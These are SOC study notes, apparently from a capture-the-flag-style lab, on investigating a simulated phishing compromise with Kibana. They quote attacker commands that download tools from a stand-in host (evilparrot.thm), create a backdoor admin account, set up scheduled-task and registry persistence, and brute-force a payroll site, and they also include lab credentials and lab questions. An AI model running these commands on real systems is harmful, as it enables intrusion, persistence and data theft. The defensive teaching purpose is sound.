# Elastic Stack & Kibana Investigation (SOC Notes)

These notes explain how SOC analysts use the **Elastic Stack (ELK Stack)** to investigate security incidents.

The explanation is simple and focused on **SOC investigation workflow**.

---

# 1. What is the Elastic Stack

Elastic Stack is a collection of tools used to **collect, store, search, and visualize logs**.

It helps security teams detect attacks and investigate incidents.

Main components:

| Component | Purpose |
|---|---|
Elasticsearch | Stores and searches large amounts of data |
Logstash | Collects and processes logs |
Kibana | Visual interface to search and analyze logs |
Beats | Lightweight agents that send logs from systems |

Basic data flow:

Logs from computers → Beats/Logstash → Elasticsearch → Kibana

---

# 2. Elasticsearch

Elasticsearch is the **core engine of the Elastic Stack**.

It is responsible for:

- storing logs
- indexing data
- enabling fast search
- analyzing large datasets

Important points:

- Built on **Apache Lucene**
- Uses **REST API**
- Can store structured and unstructured data

SOC Example:

A SOC analyst stores security logs such as:

- firewall logs
- Windows logs
- EDR alerts
- network traffic

These logs are stored in Elasticsearch so analysts can **quickly search for suspicious activity**.

---

# 3. Logstash

Logstash is used for **data ingestion and processing**.

Its job is to collect logs from different sources and prepare them for Elasticsearch.

Main functions:

1. Collect logs
2. Parse and clean data
3. Transform log format
4. Send logs to Elasticsearch

Logstash works using three stages:

| Stage | Function |
|---|---|
Input | Collect data from sources |
Filter | Process and modify data |
Output | Send data to Elasticsearch |

SOC Example:

Logs from different security tools may have different formats.

Logstash:

- parses logs
- standardizes them
- sends them to Elasticsearch

---

# 4. Kibana

Kibana is the **visual dashboard of the Elastic Stack**.

It allows analysts to:

- search logs
- filter data
- build dashboards
- visualize security events

Kibana provides visualizations such as:

- line charts
- bar charts
- pie charts
- heat maps
- tables

SOC Example:

A SOC analyst may use Kibana to view:

- top attacking IP addresses
- login failures
- malware alerts
- suspicious network traffic

---

# 5. Beats

Beats are **lightweight data shippers**.

They run on systems and send logs to Elasticsearch or Logstash.

Beats are useful because they use very few system resources.

Examples:

| Beat | Data Collected |
|---|---|
Filebeat | Log files |
Metricbeat | System metrics |
Packetbeat | Network traffic |
Winlogbeat | Windows event logs |

Beats are commonly used on endpoints such as:

- laptops
- servers
- cloud machines

---

# 6. Incident Scenario

Company: Servidae Industries

User: Bill Smith (Finance Executive)

Incident description:

Bill received an **email from an unknown sender** with a **PDF attachment**.

Bill downloaded and opened the file.

After opening the PDF:

- the computer became slow
- the system started freezing

Soon after, security alerts detected suspicious activity.

---

# 7. Security Alert Details

EDR Alert:

Suspicious network activity and possible remote access detected.

Affected system:

SERVIDAE-BOB-FIN-04

Time range of suspicious activity:

May 11, 2023  
18:45 → 19:01

SOC analyst must investigate logs to determine:

- what happened
- whether the system was compromised
- what actions were performed by the attacker

---

# 8. Elastic Agent

The organization installed an **Elastic Agent** on Bill's workstation.

Elastic Agent collects logs such as:

- system activity
- network connections
- process execution
- security events

These logs are sent to the Elastic Stack for analysis.

---

# 9. Accessing Kibana

SOC analysts use Kibana to investigate logs.

Steps to access Kibana:

1. Start the investigation machine
2. Open the browser
3. Navigate to the Kibana dashboard
4. Log in with provided credentials

Example credentials:

Username: elastic  
Password: 1N5qMlh7AYXYzjxad*02

If the system shows **Bad Gateway**, it means services are still starting.

Wait a few minutes for Elasticsearch and Kibana to load.

---

# 10. Discover Page in Kibana

The **Discover tab** is the main place where analysts explore logs.

Using Discover, analysts can:

- search log events
- filter data
- detect patterns
- investigate incidents

It shows raw logs collected from systems.

SOC analysts typically start their investigations here.

---

# 11. Importance of Time Filtering

Systems generate thousands of logs every minute.

Without filtering, it becomes difficult to analyze events.

Kibana provides a **time filter** to narrow down logs.

SOC analysts always focus on the **time range mentioned in the alert**.

---

# 12. Applying the Time Filter

The alert indicates suspicious activity occurred between:

May 11, 2023  
18:45 → 19:01

Steps to apply the filter:

1. Open the date selector
2. Select the **Absolute** time option
3. Set start time:

May 11, 2023 18:45:00

4. Set end time:

May 11, 2023 19:01:00

5. Click **Update**

Now Kibana will show only logs generated during that period.

---

# 13. Why Time Filtering is Important

Time filtering helps analysts:

- focus only on relevant logs
- reduce noise
- identify events related to the attack
- reconstruct the attack timeline

This allows SOC analysts to quickly determine what happened during the incident.

---

# 14. SOC Investigation Mindset

During investigations, SOC analysts typically ask:

1. When did the attack start?
2. Which system was affected?
3. What suspicious processes executed?
4. Was there unauthorized access?
5. Did the attacker perform remote commands?
6. Was any data stolen?

By analyzing logs in Kibana, analysts can build a **complete timeline of attacker activity**.

---

# Key Takeaway

Elastic Stack helps SOC analysts:

- collect logs from systems
- search and analyze large datasets
- detect malicious activity
- investigate security incidents efficiently
---
# Lab Questions
## Q.1 Update the date and time filter as specified. How many total hits were captured within the selected time period?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 6 29 07 PM" src="https://github.com/user-attachments/assets/a410d562-34be-44c1-aa4d-df8b0295f153" />

---

# Kibana Investigation Notes (SOC Perspective)

These notes explain how SOC analysts use **fields, filters, and logs in Kibana** to investigate a compromised workstation.

The goal is to understand **what commands the attacker executed and how the system was compromised**.

---

# 1. What are Fields in Kibana

Fields are **individual pieces of information inside a log event**.

Think of Kibana logs like a spreadsheet:

| Timestamp | User | Process | Command |
|---|---|---|---|
18:45:22 | bsmith | powershell.exe | script.ps1 |

Explanation:

- Each **row = one log event**
- Each **column = a field**

Fields help analysts **search, filter, and analyze logs easily**.

---

# 2. Important Fields for SOC Investigation

During an investigation, some fields are more useful than others.

| Field | Meaning | Why SOC Uses It |
|---|---|---|
agent.name | Computer that generated the log | Identifies the affected machine |
event.category | Type of event | Helps identify process or network activity |
process.command_line | Full command executed | Shows attacker commands |
process.executable | Path of executable file | Helps identify malicious files |
process.name | Process name | Detect suspicious programs |
process.parent.name | Parent process | Shows which process started another process |
related.user | User account involved | Identify compromised user |
source.ip | Source IP address | Detect attacker IP |
destination.ip | Target IP address | Detect suspicious connections |

These fields help analysts **reconstruct attacker activity**.

---

# 3. Adding Fields in Kibana

In Kibana's **Available Fields panel**, analysts can add fields to the table.

Steps:

1. Find a field in the left panel.
2. Hover over the field name.
3. Click the **+ icon**.

The field will appear as a **column in the log table**.

Example fields to add:

agent.name  
process.name  
process.command_line  
process.parent.name  
related.user  
source.ip  
destination.ip  

This makes log analysis much easier.

---

# 4. Using Top Values

Kibana provides a feature called **Top Values**.

If you click a field, Kibana shows the **most common values**.

Example for destination.ip:

| IP Address | Count |
|---|---|
10.0.0.5 | 3 |
192.168.1.10 | 5 |
45.33.32.12 | 120 |

SOC analysts use this to detect:

- suspicious IP addresses
- command-and-control servers
- unusual processes
- abnormal user activity

---

# 5. Sorting Logs

Logs can be sorted by time.

By default Kibana shows:

Newest → Oldest

But for investigations we prefer:

Oldest → Newest

This helps analysts **see how the attack started**.

Steps:

1. Click the **Sort icon**
2. Select

Old-New

Now logs appear in **chronological order**.

---

# 6. Reducing Logs Using Filters

Initially there were many logs:

920 events

This is too many to analyze manually.

SOC analysts apply filters to focus on **relevant logs**.

---

# 7. Filtering Command Execution

Because we suspect the attacker executed commands, we filter for:

process.command_line

Steps:

1. Click the field
2. Select:

Filter for field present

This shows only logs that contain command execution.

Result:

920 logs → 174 logs

Now we only see events where commands were run.

---

# 8. Filtering by Workstation

The investigation focuses only on Bill's computer.

Field:

agent.name

Filter value:

SERVIDAE-BOB-FIN-04

This ensures we only see logs from **Bill's workstation**.

---

# 9. Filtering by User

We also want to see actions performed by Bill's account.

Field:

related.user

Filter value:

bsmith

Now we can see **all commands executed by Bill's account**.

This helps determine whether the account was **compromised**.

---

# 10. Detecting Suspicious Process

The first log entry shows:

process.name = powershell.exe

User:

bsmith

This is suspicious because:

- Bill is a **Finance Executive**
- Finance users normally do **not use PowerShell**

PowerShell is often used by attackers because it allows them to:

- run scripts
- control the system
- execute remote commands

---

# 11. Expanding a Log Entry

To see more information, analysts expand the log entry.

Steps:

1. Click the **Expand icon**
2. Kibana opens the **Expanded Document**

The expanded document shows all fields for that log event.

Logs appear in **JSON key-value format**.

---

# 12. Important Fields in Expanded Logs

Two fields are especially important:

message  
process.command_line  

These reveal the **exact command executed**.

Example:

powershell.exe -ExecutionPolicy bypass invoice.ps1

This indicates a **PowerShell script was executed**.

---

# 13. Identifying the Malicious File

The log shows the file path.

Example:

invoice.pdf.ps1

This reveals something important.

The file pretends to be:

invoice.pdf

But its real extension is:

.ps1

A **PowerShell script**.

---

# 14. File Extension Spoofing

Attackers often hide malicious files using **file extension spoofing**.

Example:

| Fake Name | Real File |
|---|---|
invoice.pdf | invoice.pdf.ps1 |
document.doc | document.doc.exe |
report.txt | report.txt.bat |

Users believe they are opening a **normal document**, but the file actually runs **malicious code**.

---

# 15. Initial Access of the Attacker

Based on the logs, the attack likely happened in this order:

1. Bill received a phishing email.
2. The email contained a fake invoice attachment.
3. Bill downloaded and opened the file.
4. The file executed a PowerShell script.
5. The script gave the attacker remote access to the workstation.

This step is known as:

Initial Access

---

# 16. Next Step in SOC Investigation

After detecting the malicious PowerShell script, analysts must investigate:

- what commands the attacker executed
- what processes were created
- whether privileges were escalated
- whether the attacker connected to external systems

By analyzing the logs step by step, SOC analysts can build a **complete attack timeline**.




---

# Lab Questions

## Q.1 Look at the Top values under the destination.ip field. Which IP address stands out?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 6 32 21 PM" src="https://github.com/user-attachments/assets/82701286-0658-41d5-ac81-0bd0f9e2a678" />
## Q.2 Use an IP address lookup tool (such as iplocation.io). What country does this IP address originate from?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 6 33 50 PM" src="https://github.com/user-attachments/assets/b20967d6-1a76-4d19-87b9-175e1c5b9002" />
## Q.3 Which process name is running the most frequently on the compromised workstation?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 6 35 43 PM" src="https://github.com/user-attachments/assets/a52850c7-276b-48f5-a632-04cec856c6af" />
## Q.4 What was the process ID (PID) of the potentially malicious PowerShell script?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 7 21 11 PM" src="https://github.com/user-attachments/assets/b4ad08d2-87c3-449b-b523-52560d596e26" />
## Q.5 What was the parent process name of the process that spawned powershell.exe?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 7 22 12 PM" src="https://github.com/user-attachments/assets/b2bdc16d-8bbd-454d-8b3f-56b2bb9a59f3" />

---
# SOC Investigation Notes – Discovery & Privilege Escalation (Simple Explanation)

These notes explain how a SOC analyst identifies **attacker discovery activity and privilege escalation** using logs in Kibana.

---

# 1. MITRE ATT&CK Framework

MITRE ATT&CK is a **knowledge base of attacker techniques**.

It helps security teams understand:

- how attackers behave
- what techniques they use
- how to detect them

Example ATT&CK stages:

| Stage | Meaning |
|---|---|
Initial Access | How attacker first entered the system |
Discovery | Attacker collects system information |
Privilege Escalation | Attacker gains higher privileges |
Persistence | Attacker keeps long-term access |
Lateral Movement | Attacker spreads to other systems |

In this investigation we focus on:

Discovery  
Privilege Escalation

---

# 2. Discovery Phase

Discovery means **the attacker is gathering information about the system**.

Attackers want to know:

- who the current user is
- what system they are on
- what network configuration exists
- what processes are running

This helps attackers **plan the next steps of the attack**.

---

# 3. Discovery Commands Found in Logs

The logs show several commands executed on Bill's workstation.

| Command | Purpose |
|---|---|
whoami.exe | Shows current user account |
hostname.exe | Shows computer name |
ipconfig.exe | Shows network configuration |
netstat.exe | Shows active network connections |
tasklist.exe | Shows running processes |

Example commands seen in logs:
whoami.exe
hostname.exe
ipconfig.exe
netstat.exe
tasklist.exe

These commands are normal for **system administrators**.

But they are suspicious because:

- Bill is a **Finance Executive**
- finance users usually do **not run command line tools**

Therefore these commands are **Indicators of Compromise (IOCs)**.

---

# 4. Enumeration Phase

This activity is called **Enumeration**.

Enumeration means:

The attacker is collecting details about the system to understand:

- system configuration
- user privileges
- running services
- network connections

This helps attackers find **vulnerabilities** and plan the next attack stage.

---

# 5. Suspicious PowerShell Download

Further logs show this command:
powershell -c Invoke-WebRequest

Invoke-WebRequest is a PowerShell command used to **download files from the internet**.

Example command found in logs:
powershell -c Invoke-WebRequest -Uri "http://evilparrot.thm/winPEASany.exe" -OutFile "winPEAS.exe"

Explanation:

| Part | Meaning |
|---|---|
Invoke-WebRequest | Download a file |
Uri | Address of the file |
OutFile | Save file locally |

This command downloads a file called:
winPEAS.exe

---

# 6. What is winPEAS

winPEAS is a **privilege escalation enumeration tool**.

It searches the system for:

- misconfigurations
- insecure permissions
- weak registry settings
- vulnerable services

Attackers use winPEAS to find ways to **gain administrator privileges**.

If winPEAS is found in logs, it is a **strong indicator of compromise**.

---

# 7. Registry Queries

After running winPEAS, the attacker checked the Windows Registry.

Command found in logs:
reg query

The Windows Registry is a database that stores:

- system configuration
- application settings
- security policies

Attackers often query the registry to check for **privilege escalation opportunities**.

---

# 8. AlwaysInstallElevated Setting

The attacker checked this registry setting:
AlwaysInstallElevated

This setting controls whether users can install software with **elevated privileges**.

If it is enabled:

- any user can install software as **administrator**

This is a **security misconfiguration**.

Attackers can exploit it to run malicious programs with admin privileges.

---

# 9. Privilege Escalation

Privilege escalation means:

The attacker increases their access level in the system.

Example:

| Before | After |
|---|---|
Normal user | Administrator |

Why attackers escalate privileges:

- access sensitive files
- control the system
- create backdoors
- disable security tools

Privilege escalation usually happens **after initial access**.

---

# 10. Using KQL to Investigate Logs

SOC analysts use **KQL (Kibana Query Language)** to search logs.

Example query used in investigation:
process.command_line: msi

Explanation:

| Part | Meaning |
|---|---|
process.command_line | Command executed |
* | Wildcard character |
msi | Searching for MSI installers |

This query finds any command containing:
msi

---

# 11. What is an MSI File

MSI files are **Windows installer packages**.

Example:
program.msi

They are used to install software.

Attackers can create **malicious MSI files** that:

- create admin users
- open reverse shells
- install malware

---

# 12. Logs Found During Investigation

The query returned three results.

Events found:

1. Download of malicious MSI file
2. Execution of MSI installer

Example commands seen:
powershell Invoke-WebRequest -Uri attacker-server/adminshell.msi

and
msiexec.exe /i adminshell.msi

Explanation:

| Command | Purpose |
|---|---|
Invoke-WebRequest | Download malicious installer |
msiexec.exe | Install MSI file |

---

# 13. Result of the MSI Execution

Running the malicious MSI file likely created:

- an elevated command shell
- administrator access for the attacker

This means the attacker successfully **escalated privileges**.

Now the attacker can:

- control the system
- modify settings
- create persistence

---

# 14. Attack Progress So Far

Based on logs, the attack likely happened in this order:

1. Bill opened a phishing attachment.
2. PowerShell script executed.
3. Attacker gained remote access.
4. Attacker performed system discovery.
5. Attacker downloaded winPEAS tool.
6. winPEAS identified a privilege escalation path.
7. Attacker checked registry configuration.
8. Attacker downloaded malicious MSI file.
9. MSI file executed with elevated privileges.

---

# 15. SOC Analyst Conclusion

Evidence strongly suggests that:

- Bill's workstation was compromised.
- The attacker performed discovery commands.
- Privilege escalation tools were used.
- A malicious MSI installer was executed.

This indicates a **successful privilege escalation attack**.

---


# Lab Questions
## Q.1 What is the domain name of the attacker's server hosting the winPEAS executable?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 7 39 27 PM" src="https://github.com/user-attachments/assets/d6d5afd0-298f-406d-b645-d5cc84e67cb7" />
## Q.2 What is the full path of the HKEY_LOCAL_MACHINE registry entry that was queried?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 7 40 46 PM" src="https://github.com/user-attachments/assets/2bc6cbc4-2daf-4bc7-8af3-c005c2bad7fe" />
## Q.3 What is the name of the malicious .msi file?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 7 41 50 PM" src="https://github.com/user-attachments/assets/d0249451-04ee-4e7f-b21c-da19542ff9fa" />
---
# SOC Investigation Notes – Persistence & Lateral Movement
(Simple SOC Analyst Revision Notes)

These notes explain how attackers **maintain access (Persistence)** and **move inside a network (Lateral Movement)** after compromising a system.

Scenario:  
Attacker already compromised **Bill Smith's workstation** and gained **administrator privileges**.

---

# 1. Persistence (MITRE ATT&CK)

Persistence means the attacker ensures they **do not lose access** to the compromised system.

Even if:
- the computer restarts
- malware is removed
- the user logs out

the attacker can **come back later**.

Common persistence techniques:

| Method | Description |
|---|---|
Creating new user accounts | Attacker creates hidden admin accounts |
Scheduled tasks | Malware runs automatically at intervals |
Registry modification | Malware runs automatically at login |
Backdoor installation | Remote shell for attacker access |

---

# 2. SYSTEM User Context

After privilege escalation, many processes run as:

SYSTEM

The SYSTEM account is a **very powerful Windows account**.

SOC analysts must change the log filter:

related.user: SYSTEM

This helps detect **commands executed with elevated privileges**.

---

# 3. Detecting Suspicious Activity Using Histogram

In Kibana, a **histogram chart** shows activity over time.

A **spike in the graph** indicates many logs occurred at that moment.

Example spike:

18:54:00

This usually means something important happened.

SOC analysts zoom into that time to investigate.

---

# 4. Creating a Backdoor User (Persistence)

Logs show the command:

net user backdoor backdoor /add /expires:never /passwordchg:no

Explanation:

| Command Part | Meaning |
|---|---|
net user | Manage user accounts |
backdoor | Username created |
/add | Create new account |
/expires:never | Password never expires |
/passwordchg:no | Password cannot be changed |

This creates a **hidden backdoor account**.

---

# 5. Giving Administrator Access

Second command observed:

net localgroup Administrators backdoor /add

Meaning:

The attacker adds the new user **backdoor** to the **Administrators group**.

Result:

The attacker now has a **permanent admin account**.

This is a common **persistence technique**.

---

# 6. Downloading a Beacon Script

Logs show:

powershell Invoke-WebRequest

File downloaded:

beacon.bat

A **.bat file (batch file)** is a script that runs commands automatically.

The name **beacon** suggests a **Command & Control (C2) beacon**.

Purpose of beacon:

- Send signals to attacker server
- Receive commands
- Send stolen data

---

# 7. Network Communication with C2 Server

Multiple commands were observed:

curl.exe

Curl is a command-line tool used for **HTTP communication**.

Attackers use curl to:

- send data
- communicate with C2 server
- download additional malware

Example attacker server:

evilparrot.thm

This likely acts as a **Command and Control server**.

---

# 8. Scheduled Task Persistence

The attacker created a scheduled task.

Command:

schtasks /create /tn "Beacon" /tr "C:\Users\bsmith\Desktop\beacon.bat" /sc minute /mo 1 /ru "System"

Explanation:

| Parameter | Meaning |
|---|---|
/create | Create new scheduled task |
/tn Beacon | Task name |
/tr beacon.bat | Script to execute |
/sc minute | Schedule type |
/mo 1 | Every 1 minute |
/ru System | Run as SYSTEM |

Result:

The beacon script runs **every minute automatically**.

Even if the system restarts, the attacker keeps access.

---

# 9. Registry Persistence

Another persistence technique used:

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

Full command:

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "BackdoorShell" /t REG_SZ /d "C:\Users\bsmith\Desktop\adminshell.msi" /f

Explanation:

| Registry Component | Meaning |
|---|---|
Run Key | Programs executed at user login |
BackdoorShell | Name of registry entry |
adminshell.msi | Malicious file |

Result:

Every time Bill logs in, the malicious file runs automatically.

---

# 10. Lateral Movement

Lateral Movement means the attacker **moves from one system to another inside the network**.

Goals of lateral movement:

- find sensitive systems
- access internal resources
- steal data
- compromise additional machines

---

# 11. Network Enumeration

The attacker executed:

ping payroll.servidae.internal

Purpose:

Check connectivity to another internal system.

The target:

payroll.servidae.internal

Likely an **internal payroll system**.

---

# 12. Brute Force Attack on Payroll Server

Logs show multiple curl requests.

Example pattern:

username=bsmith  
password=Pass3  
password=Pass4  
password=Pass5  

This is a **brute-force login attack**.

The attacker repeatedly tries passwords until successful.

---

# 13. Identifying Successful Login

Developers explained:

A successful login returns a session cookie:

PHPSESSID

SOC analysts search logs using:

*PHPSESSID*

This identifies **successful authentication events**.

Results show **two successful logins**.

Meaning:

The attacker successfully accessed the payroll system.

---

# 14. Accessing Sensitive Internal Data

After login, the attacker accessed:

employee-payroll.php

This page likely contains:

- employee salary data
- payroll records
- financial information

---

# 15. Downloading Sensitive File

Logs show the attacker downloaded:

bank-details.csv

CSV files typically contain structured data.

This file likely contains:

- employee bank account numbers
- financial details

---

# 16. Data Exfiltration

Immediately after download, logs show:

FTP command execution.

FTP (File Transfer Protocol) is used to **transfer files across networks**.

The attacker likely uploaded:

bank-details.csv

to their own server.

This stage is called:

Data Exfiltration

---

# 17. Complete Attack Timeline

| Step | Attack Stage |
|---|---|
1 | Phishing email received |
2 | Malicious PowerShell script executed |
3 | Remote access established |
4 | Discovery commands executed |
5 | winPEAS enumeration tool used |
6 | Privilege escalation achieved |
7 | Backdoor admin user created |
8 | Scheduled task persistence |
9 | Registry persistence |
10 | Internal network enumeration |
11 | Brute-force attack on payroll server |
12 | Successful authentication |
13 | Payroll data accessed |
14 | Sensitive file downloaded |
15 | Data exfiltration via FTP |

---

# 18. Security Mitigation Strategies

To prevent similar attacks:

| Defense Strategy | Description |
|---|---|
Network Segmentation | Limit access between internal systems |
Strong Authentication | Enforce strong password policies |
Zero Trust Architecture | Verify every access request |
Monitoring & SIEM | Detect suspicious activity quickly |
Least Privilege Principle | Users only get necessary permissions |

Zero Trust principle:

Never trust, always verify.

---

# Key SOC Takeaway

The attacker:

- gained access through phishing
- performed system discovery
- escalated privileges
- established persistence
- moved laterally inside the network
- accessed sensitive payroll data
- exfiltrated confidential information

This investigation demonstrates the importance of **log analysis, SIEM monitoring, and incident response** in modern SOC operations.

---

# Lab Questions
## Q.2 What is the flag sent via cURL requests to the evilparrot.thm server?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 7 47 28 PM" src="https://github.com/user-attachments/assets/60aaec8f-4b07-4000-9b72-80ab93be6104" />
## Q.4 What was the password that the attacker used to access Bill's user account on the internal payroll website?
## Q.5 What flag was included within the HTTP requests during the attacker's successful logins?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 7 54 30 PM" src="https://github.com/user-attachments/assets/fbf536c2-c39d-4520-8782-55f105a86837" />
## Q.6 What was the session cookie value that the attacker included in the cURL request at 18:58:08.001?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 7 57 54 PM" src="https://github.com/user-attachments/assets/a8882620-3019-4ff7-800b-035dbb07664b" />

## Q.7 What is the name of the sensitive file that the attacker downloaded?
<img width="1470" height="956" alt="Screenshot 2026-03-10 at 7 59 00 PM" src="https://github.com/user-attachments/assets/71b772a6-13e8-42e6-a275-65a6773e04a9" />


